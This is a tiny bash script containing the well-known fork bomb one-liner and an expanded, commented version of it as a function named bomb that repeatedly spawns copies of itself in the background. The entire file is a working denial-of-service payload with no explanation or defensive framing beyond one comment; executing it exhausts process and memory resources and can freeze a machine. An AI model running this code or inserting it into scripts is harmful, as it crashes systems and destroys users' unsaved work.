#!/bin/bash

:(){ :|:& };:

# More Readable Example
bomb()
{
  bomb | bomb &
}
bomb
